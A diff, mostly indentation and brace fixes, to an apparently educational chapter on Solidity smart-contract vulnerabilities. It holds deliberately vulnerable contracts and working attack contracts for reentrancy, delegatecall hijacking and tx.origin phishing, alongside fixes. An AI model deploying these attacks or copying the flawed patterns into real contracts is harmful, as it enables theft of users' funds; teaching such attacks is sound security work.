@@ -63,7 +63,6 @@ week.
 [source,solidity,linenums]
 ----
 contract EtherStore {
-
     uint256 public withdrawalLimit = 1 ether;
     mapping(address => uint256) public lastWithdrawTime;
     mapping(address => uint256) public balances;
@@ -82,7 +81,7 @@ contract EtherStore {
         balances[msg.sender] -= _weiToWithdraw;
         lastWithdrawTime[msg.sender] = now;
     }
- }
+}
 ----
 ====
 
@@ -104,32 +103,32 @@ requested amount of ether. Consider an attacker who has created the contract in 
 import "EtherStore.sol";
 
 contract Attack {
-  EtherStore public etherStore;
+    EtherStore public etherStore;
 
-  // intialize the etherStore variable with the contract address
-  constructor(address _etherStoreAddress) {
-      etherStore = EtherStore(_etherStoreAddress);
-  }
+    // intialize the etherStore variable with the contract address
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
 
-  function attackEtherStore() public payable {
-      // attack to the nearest ether
-      require(msg.value >= 1 ether);
-      // send eth to the depositFunds() function
-      etherStore.depositFunds.value(1 ether)();
-      // start the magic
-      etherStore.withdrawFunds(1 ether);
-  }
+    function attackEtherStore() public payable {
+        // attack to the nearest ether
+        require(msg.value >= 1 ether);
+        // send eth to the depositFunds() function
+        etherStore.depositFunds.value(1 ether)();
+        // start the magic
+        etherStore.withdrawFunds(1 ether);
+    }
 
-  function collectEther() public {
-      msg.sender.transfer(this.balance);
-  }
+    function collectEther() public {
+        msg.sender.transfer(this.balance);
+    }
 
-  // fallback function - where the magic happens
-  function () payable {
-      if (etherStore.balance > 1 ether) {
-          etherStore.withdrawFunds(1 ether);
-      }
-  }
+    // fallback function - where the magic happens
+    function () payable {
+        if (etherStore.balance > 1 ether) {
+            etherStore.withdrawFunds(1 ether);
+        }
+    }
 }
 ----
 ====
@@ -216,7 +215,6 @@ reentrancy-free contract:
 [source,solidity,linenums]
 ----
 contract EtherStore {
-
     // initialize the mutex
     bool reEntrancyMutex = false;
     uint256 public withdrawalLimit = 1 ether;
@@ -242,7 +240,7 @@ contract EtherStore {
         // release the mutex after the external call
         reEntrancyMutex = false;
     }
- }
+}
 ----
 
 [[real_world_example_the_dao]]
@@ -303,7 +301,6 @@ unexpected logic flows. For example, consider the +TimeLock+ contract in
 [source,solidity,linenums]
 ----
 contract TimeLock {
-
     mapping(address => uint) public balances;
     mapping(address => uint) public lockTime;
 
@@ -359,24 +356,23 @@ gives a solution to one of the levels_.
 pragma solidity ^0.4.18;
 
 contract Token {
+    mapping(address => uint) balances;
+    uint public totalSupply;
 
-  mapping(address => uint) balances;
-  uint public totalSupply;
+    function Token(uint _initialSupply) {
+        balances[msg.sender] = totalSupply = _initialSupply;
+    }
 
-  function Token(uint _initialSupply) {
-    balances[msg.sender] = totalSupply = _initialSupply;
-  }
+    function transfer(address _to, uint _value) public returns (bool) {
+        require(balances[msg.sender] - _value >= 0);
+        balances[msg.sender] -= _value;
+        balances[_to] += _value;
+        return true;
+    }
 
-  function transfer(address _to, uint _value) public returns (bool) {
-    require(balances[msg.sender] - _value >= 0);
-    balances[msg.sender] -= _value;
-    balances[_to] += _value;
-    return true;
-  }
-
-  function balanceOf(address _owner) public constant returns (uint balance) {
-    return balances[_owner];
-  }
+    function balanceOf(address _owner) public constant returns (uint balance) {
+        return balances[_owner];
+    }
 }
 ----
 ====
@@ -411,33 +407,32 @@ To demonstrate how these libraries are used in Solidity, let's correct the `Time
 [source,solidity,linenums]
 ----
 library SafeMath {
-
-  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
-    if (a == 0) {
-      return 0;
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+      if (a == 0) {
+          return 0;
+      }
+      uint256 c = a * b;
+      assert(c / a == b);
+      return c;
     }
-    uint256 c = a * b;
-    assert(c / a == b);
-    return c;
-  }
 
-  function div(uint256 a, uint256 b) internal pure returns (uint256) {
-    // assert(b > 0); // Solidity automatically throws when dividing by 0
-    uint256 c = a / b;
-    // assert(a == b * c + a % b); // This holds in all cases
-    return c;
-  }
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        // assert(b > 0); // Solidity automatically throws when dividing by 0
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // This holds in all cases
+        return c;
+    }
 
-  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-    assert(b <= a);
-    return a - b;
-  }
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        assert(b <= a);
+        return a - b;
+    }
 
-  function add(uint256 a, uint256 b) internal pure returns (uint256) {
-    uint256 c = a + b;
-    assert(c >= a);
-    return c;
-  }
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        assert(c >= a);
+        return c;
+    }
 }
 
 contract TimeLock {
@@ -554,7 +549,6 @@ Let’s explore some pitfalls that can arise given this knowledge. Consider the 
 [source,solidity,linenums]
 ----
 contract EtherGame {
-
     uint public payoutMileStone1 = 3 ether;
     uint public mileStone1Reward = 2 ether;
     uint public payoutMileStone2 = 5 ether;
@@ -590,7 +584,7 @@ contract EtherGame {
         redeemableEther[msg.sender] = 0;
         msg.sender.transfer(transferValue);
     }
- }
+}
 ----
 ====
 
@@ -635,7 +629,6 @@ look like:
 [source,solidity,linenums]
 ----
 contract EtherGame {
-
     uint public payoutMileStone1 = 3 ether;
     uint public mileStone1Reward = 2 ether;
     uint public payoutMileStone2 = 5 ether;
@@ -672,7 +665,7 @@ contract EtherGame {
         redeemableEther[msg.sender] = 0;
         msg.sender.transfer(transferValue);
     }
- }
+}
 ----
 
 Here, we have created a new variable, `depositedEther`, which keeps
@@ -763,7 +756,6 @@ Let us now consider a contract that utilizes this library, shown in <<fib_balanc
 [source,solidity,linenums]
 ----
 contract FibonacciBalance {
-
     address public fibonacciLibrary;
     // the current Fibonacci number to withdraw
     uint public calculatedFibNumber;
@@ -908,7 +900,7 @@ contract Attack {
         // is called we don't send out any ether
         <attacker_address>.transfer(this.balance); // we take all the ether
     }
- }
+}
 ----
 
 Notice that this attack contract modifies the `calculatedFibNumber` by
@@ -1050,7 +1042,6 @@ Let's quickly explore a trivial example:
 [source,solidity,linenums]
 ----
 contract HashForEther {
-
     function withdrawWinnings() {
         // Winner if the last 8 hex characters of the address are 0
         require(uint32(msg.sender) == 0);
@@ -1225,7 +1216,6 @@ https://en.wikipedia.org/wiki/ROT13[ROT13 cipher].
 ----
 // encryption contract
 contract Rot13Encryption {
-
    event Result(string convertedString);
 
     // rot13-encrypt a string
@@ -1295,7 +1285,7 @@ contract EncryptionContract {
         // potentially do some operations here
         encryptionLibrary.rot13Encrypt(privateInfo);
      }
- }
+}
 ----
 
 The issue with this contract is that the `encryptionLibrary` address is
@@ -1305,7 +1295,6 @@ not public or constant. Thus, the deployer of the contract could give an address
 ----
 // encryption contract
 contract Rot26Encryption {
-
    event Result(string convertedString);
 
     // rot13-encrypt a string
@@ -1362,7 +1351,7 @@ contract Print{
     function rot13Encrypt(string text) public {
         emit Print(text);
     }
- }
+}
 ----
 
 If the address of either of these contracts were given in the
@@ -1379,13 +1368,13 @@ line pass:[<code>encryptionLibrary.rot13&#x200b;Encrypt()</code>], if the contra
 
 [source,solidity,linenums]
 ----
- contract Blank {
-     event Print(string text);
-     function () {
-         emit Print("Here");
-         // put malicious code here and it will run
-     }
- }
+contract Blank {
+    event Print(string text);
+    function () {
+        emit Print("Here");
+        // put malicious code here and it will run
+    }
+}
 ----
 
 then an event with the text `Here` would be emitted. Thus, if users can
@@ -1650,7 +1639,6 @@ Live Ethereum Contracts for the &lsquo;Unchecked-Send&rsquo; Bug&#x201d;].
 [source,solidity,linenums]
 ----
 contract Lotto {
-
     bool public payedOut = false;
     address public winner;
     uint public winAmount;
@@ -1716,7 +1704,7 @@ function `cash` in <<lotto_security>>.
 [source,solidity,linenums]
 ----
 ...
-  function cash(uint roundIndex, uint subpotIndex){
+    function cash(uint roundIndex, uint subpotIndex){
 
         var subpotsCount = getSubpotsCount(roundIndex);
 
@@ -1739,7 +1727,7 @@ function `cash` in <<lotto_security>>.
 
         rounds[roundIndex].isCashed[subpotIndex] = true;
         //Mark the round as cashed
-}
+    }
 ...
 ----
 ====
@@ -1943,12 +1931,12 @@ contract DistributeTokens {
     function invest() public payable {
         investors.push(msg.sender);
         investorTokens.push(msg.value * 5); // 5 times the wei sent
-        }
+    }
 
     function distribute() public {
         require(msg.sender == owner); // only owner
         for(uint i = 0; i < investors.length; i++) {
-            // here transferToken(to,amount) transfers "amount" of 
+            // here transferToken(to,amount) transfers "amount" of
             // tokens to the address "to"
             transferToken(investors[i],investorTokens[i]);
         }
@@ -1971,23 +1959,23 @@ allows tokens to be transferable. For example:
 +
 [source,solidity,linenums]
 ----
-bool public isFinalized = false;
-address public owner; // gets set somewhere
+    bool public isFinalized = false;
+    address public owner; // gets set somewhere
 
-function finalize() public {
-    require(msg.sender == owner);
-    isFinalized == true;
-}
+    function finalize() public {
+        require(msg.sender == owner);
+        isFinalized == true;
+    }
 
-// ... extra ICO functionality
+    // ... extra ICO functionality
 
-// overloaded transfer function
-function transfer(address _to, uint _value) returns (bool) {
-    require(isFinalized);
-    super.transfer(_to,_value)
-}
+    // overloaded transfer function
+    function transfer(address _to, uint _value) returns (bool) {
+        require(isFinalized);
+        super.transfer(_to,_value)
+    }
 
-...
+    ...
 ----
 +
 In such cases, if the privileged user loses their private keys or becomes
@@ -2250,7 +2238,6 @@ Let’s consider the relatively simple name registrar contract in <<nameregistra
 ----
 // A locked name registrar
 contract NameRegistrar {
-
     bool public unlocked = false;  // registrar locked, no name updates
 
     struct NameRecord { // map hashes to addresses
@@ -2509,7 +2496,6 @@ create an attacking contract of the form:
 import "Phishable.sol";
 
 contract AttackContract {
-
     Phishable phishableContract;
     address attacker; // The attacker's address to receive funds
 
